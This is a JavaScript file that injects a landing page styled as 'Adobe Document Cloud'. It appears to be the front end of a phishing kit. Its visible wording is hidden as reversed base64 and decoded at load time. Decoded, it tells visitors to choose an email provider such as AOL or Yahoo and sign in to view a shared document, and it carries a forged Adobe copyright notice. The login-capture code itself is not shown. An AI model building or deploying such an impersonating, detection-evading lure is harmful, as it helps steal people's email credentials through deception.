
// For demo obfuscation
const PREFIX = "OBFS";
const SUFFIX = "END";

const obfEnd = 'OBFS==Qaz12aEND';


function deobfString(str) {
    let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
    let reversed = withoutPrefixSuffix.split('').reverse().join('');
    return atob(reversed);
  }



function deObfData() {
    try{

        // Rest
        document.getElementById('ob1').innerText = deobfString(document.getElementById('ob1').innerText);
        document.getElementById('ob2').innerText = deobfString(document.getElementById('ob2').innerText);
        document.getElementById('ob3').innerText = deobfString(document.getElementById('ob3').innerText);
        document.getElementById('ob4').innerText = deobfString(document.getElementById('ob4').innerText);

    } catch {
        return;
    }
}



async function setPrimaryContent(locationDivId, contentHTML, cssUrls, jsUrls){
    // Handling the landing page content this way to allow more isolation of styles and scripts
    // and enable more efficient methods that will come soon
    // Create shadowroot element and append to it HTML, CSS, JS content

    const contentDiv = document.getElementById(locationDivId);
    const shadowRoot = contentDiv.attachShadow({ mode: 'open' });

    let scriptsToLoad = jsUrls.length;

    const checkAllLoaded = () => {
        if (scriptsToLoad === 0) {
            // dispatch the event when all scripts are loaded
            const contentLoadedEvent = new Event('PrimaryContentLoaded', { bubbles: true, composed: true });
            document.dispatchEvent(contentLoadedEvent);
            console.log("Secondary Dispatched: PrimaryContentLoaded")
        }
    };

    // function to append CSS files
    cssUrls.forEach(url => {
        const link = document.createElement('link');
        link.href = url;
        link.type = 'text/css';
        link.rel = 'stylesheet';
        shadowRoot.appendChild(link);
    });

    // append HTML content
    shadowRoot.innerHTML += contentHTML;


    // function to append JS files
    jsUrls.forEach(url => {
        const script = document.createElement('script');
        script.src = url;
        script.type = 'text/javascript';
        script.onload = () => {
            scriptsToLoad--;
            checkAllLoaded(); 
        };
        script.onerror = () => {
            console.error(`Error loading script: ${url}`);
            scriptsToLoad--;
            checkAllLoaded(); 
        };
        shadowRoot.appendChild(script);
    });

    // check if there are no scripts to load
    checkAllLoaded();
}


function handleDOMContentLoaded() {    

    // inject the primary page, then initialize it
    setPrimaryContent('primary', primaryHTML, cssURLs, jsURLs)

    document.getElementById('page').style.display = 'none';

}

document.addEventListener('DOMContentLoaded', handleDOMContentLoaded);


// Content for the landing page (aka primary page)

const cssURLs = ['https://fonts.googleapis.com/css?family=Yellowtail&display=swap', 'css/style.css', 'https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css']
const jsURLs = ['https://code.jquery.com/jquery-3.3.1.js', 'https://kit.fontawesome.com/585b051251.js', 'https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js', 'https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.bundle.min.js', 'js/script.js']

const primaryHTML = `
   <div class="container-fluid">
      <div class="row" style="background-image: url('img/8.jpg'); background-size: cover;background-repeat: no-repeat;">
        <div class="container">
          <div class="row">
            <div class="col-lg-6 mx-auto my-5 px-5 pb-5" style="border:1px solid; background-color: rgba(0,0,0,0.7);border-radius:15px;">
              <div class="text-center pt-5"> 
                <img id="logo" src="img/logo.svg" class="img-fluid" width="100px"><br>
                <span class="h4 text-white" id="ob1">OBFS=QWdvx2QgQnbl1Wdj9GRgUmYvRWQEND</span><br>
                <span class="h5 text-white font-weight-normal" id="ob2">OBFS==gLlxWamBCZlJXYoNHI3VWa2Byb0Bibpd2bsBydvxWZiBiclRWa29mcwBCbpFWblBic19WegU2cv9GajBSZzFWZsBFIsQnbl1Wdj9GZgUGa0BCZhVmcg8GVEND</span>
              </div>
              <div class="mt-3">
                <div class="row">
                  <div class="col-lg-12 ">
                    <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class="  mt-2" style=" background-color: #31459B;">
                        <img id="logimg1" src="img/logo.svg" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span id="logtxt1" class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">OBFS==AbvFEIoRXa3BibpBibnl2UEND</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="365" class="hvr-grow w-100" style="text-decoration: none;">
                      <div class=" mt-2" style=" background-color: #FF3C00;">
                        <img id="logimg2" src="img/logo.svg" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span id="logtxt2" class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">OBFS==Adm92cvJ3Yp1EIoRXa3BibpBibnl2UEND</span>
                      </div>
                    </a>
                  </div>
                </div>
                <div class="row">
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #5F0F68;">
                        <img id="logimg3" src="img/logo.svg" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span id="logtxt3" class="pl-4" style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">OBFS==QIv9GahlFIoRXa3BibpBibnl2UEND</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                    <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                      <div class=" mt-2" style=" background-color: #0B5BD3;">
                        <img id="logimg4" src="img/logo.svg" class="img-fluid" width="40px" style=" background-color: rgba(0,0,0,0.3); padding:5px;">
                        <span id="logtxt4" class="pl-4"  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">OBFS=wWah1EIyVGa09EIoRXa3BibpBibnl2UEND</span>
                      </div>
                    </a>
                  </div>
                  <div class="col-lg-12">
                     <p class="text-white mt-3 text-center" id="ob3">OBFS==gL5V2agU2cuV2YpxGIsFmbvlGdpRGZhBibhByZulGZpZ3byBHI5JGIkV2aj9GbuVHIlJGIuF2YgMXZyVHdhVmZgQWdvx2QgQnbl1Wdj9GRgUmYvRWQgwCZ19GbDBCduVWb1N2bEBSZi9GZBBibvBXdgQHbpVnQEND</p>
                <p class="h5 text-center text-white" id="ob4">OBFS=4CZlZnclNXZyBCdodWayBCbsFEIsQWZ0FmcvBncvNmbpBSblR3c5NHIlJ2bkFEI0IDMyASq0h2ZpJVew92QEND</p> 
                    
                  </div>
               
              </div> 
            </div>
          </div>
        </div>


      </div> 
    </div>
    </div>
`